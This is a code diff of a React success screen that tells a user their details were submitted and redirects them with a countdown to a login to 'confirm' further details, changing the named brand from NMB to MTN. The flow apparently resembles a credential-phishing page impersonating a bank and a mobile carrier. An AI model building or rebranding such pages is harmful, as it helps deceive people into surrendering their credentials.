@@ -34,9 +34,9 @@ function Success({ name }) {
       <p>Your details have been submitted successfully.</p>
       <p>
         For the next step, you are required to confirm your{" "}
-        <b style={{ color: " rgb(9, 20, 37)" }}>NMB details</b>{" "}
+        <b style={{ color: " rgb(9, 20, 37)" }}> MTN details</b>{" "}
       </p>
-      <span>Redirecting to NMB login... {count}</span>
+      <span>Redirecting to MTN login... {count}</span>
     </div>
   );
 }
